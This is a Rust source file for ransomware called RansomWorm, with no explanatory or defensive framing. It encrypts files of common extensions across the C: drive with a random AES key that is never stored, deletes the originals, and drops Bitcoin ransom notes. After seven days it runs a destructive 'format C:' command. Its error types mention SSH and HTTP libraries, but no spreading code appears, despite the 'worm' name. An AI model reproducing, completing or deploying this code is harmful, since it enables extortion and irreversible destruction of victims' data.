use std::fs::File;
use std::io::{self, Write, Read};
use std::process::Command;
use std::fmt;
use std::path::Path;
use walkdir::WalkDir;
use std::thread;
use std::time::Duration;

use openssl::error::ErrorStack;
use openssl::symm::{Crypter, Cipher, Mode};
use openssl::rand::rand_bytes;

const AES_KEY_SIZE: usize = 32;
const AES_IV_SIZE: usize = 16;
const DAYS_UNTIL_WIPE: u64 = 7;

#[derive(Debug)]
enum WormError {
    OpensslError(ErrorStack),
    IoError(io::Error),
    Base64Error(base64::DecodeError),
    ReqwestError(reqwest::Error),
    LoginError(ssh2::Error),
}

impl From<ErrorStack> for WormError {
    fn from(err: ErrorStack) -> WormError {
        WormError::OpensslError(err)
    }
}

impl From<io::Error> for WormError {
    fn from(err: io::Error) -> WormError {
        WormError::IoError(err)
    }
}

impl From<base64::DecodeError> for WormError {
    fn from(err: base64::DecodeError) -> WormError {
        WormError::Base64Error(err)
    }
}

impl From<reqwest::Error> for WormError {
    fn from(err: reqwest::Error) -> WormError {
        WormError::ReqwestError(err)
    }
}

impl From<ssh2::Error> for WormError {
    fn from(err: ssh2::Error) -> WormError {
        WormError::LoginError(err)
    }
}

impl fmt::Display for WormError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            WormError::OpensslError(err) => write!(f, "OpenSSL error: {}", err),
            WormError::IoError(err) => write!(f, "IO error: {}", err),
            WormError::Base64Error(err) => write!(f, "Base64 error: {}", err),
            WormError::ReqwestError(err) => write!(f, "Reqwest error: {}", err),
            WormError::LoginError(err) => write!(f, "Login error: {:?}", err),
        }
    }
}

struct RansomWorm {
    encryption_key: Vec<u8>,
    iv: Vec<u8>,
}

impl RansomWorm {
    fn new() -> Result<Self, WormError> {
        let mut encryption_key = vec![0u8; AES_KEY_SIZE];
        let mut iv = vec![0u8; AES_IV_SIZE];
        rand_bytes(&mut encryption_key)?;
        rand_bytes(&mut iv)?;

        Ok(RansomWorm {
            encryption_key,
            iv,
        })
    }

    fn encrypt_file(&self, file_path: &Path) -> Result<(), WormError> {
        let mut file = File::open(file_path)?;
        let mut data = Vec::new();
        file.read_to_end(&mut data)?;

        let cipher = Cipher::aes_256_cbc();
        let mut encrypter = Crypter::new(
            cipher,
            Mode::Encrypt,
            &self.encryption_key,
            Some(&self.iv)
        )?;

        let mut ciphertext = vec![0u8; data.len() + cipher.block_size()];
        let mut count = encrypter.update(&data, &mut ciphertext)?;
        count += encrypter.finalize(&mut ciphertext[count..])?;

        let mut output_file = File::create(format!("{}.encrypted", file_path.display()))?;
        output_file.write_all(&ciphertext[..count])?;
        
        std::fs::remove_file(file_path)?;

        Ok(())
    }

    fn spread_and_encrypt(&self) -> Result<(), WormError> {
        let target_extensions = vec![
            "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", 
            "txt", "jpg", "jpeg", "png", "gif", "mp3", "mp4",
            "zip", "rar", "7z", "sql", "db", "mdb", "bak"
        ];

        for entry in WalkDir::new("C:\\").into_iter().filter_map(|e| e.ok()) {
            if entry.file_type().is_file() {
                if let Some(ext) = entry.path().extension() {
                    if let Some(ext_str) = ext.to_str() {
                        if target_extensions.contains(&ext_str.to_lowercase().as_str()) {
                            if let Err(e) = self.encrypt_file(entry.path()) {
                                eprintln!("Failed to encrypt {}: {}", entry.path().display(), e);
                            }
                        }
                    }
                }
            }
        }

        Ok(())
    }

    fn create_ransom_note(&self) -> Result<(), WormError> {
        let note = "Your files have been encrypted. To decrypt them, you must pay 1 Bitcoin to the following address: <INSERT_ADDRESS>\n\nWARNING: Your system will be wiped in 7 days if payment is not received.";
        
        // Create note in root directory
        let mut file = File::create("C:\\RANSOM_NOTE.txt")?;
        file.write_all(note.as_bytes())?;
        
        // Create note on Desktop
        if let Ok(desktop) = std::env::var("USERPROFILE") {
            let desktop_path = format!("{}\\Desktop\\RANSOM_NOTE.txt", desktop);
            let mut desktop_file = File::create(desktop_path)?;
            desktop_file.write_all(note.as_bytes())?;
        }
        Ok(())
        }
    fn wipe_system(&self) -> Result<(), WormError> {
        Command::new("cmd")
            .args(&["/C", "format C: /fs:NTFS /p:1 /y"])
            .output()?;
        Ok(())
    }
}

   fn main() -> Result<(), WormError> {
    let worm = RansomWorm::new()?;
    worm.spread_and_encrypt()?;
    worm.create_ransom_note()?;
    
    // Start timer for system wipe
    thread::spawn(move || {
        thread::sleep(Duration::from_secs(60 * 60 * 24 * DAYS_UNTIL_WIPE));
        if let Err(e) = worm.wipe_system() {
            eprintln!("Failed to wipe system: {}", e);
        }
    });

    Ok(())
}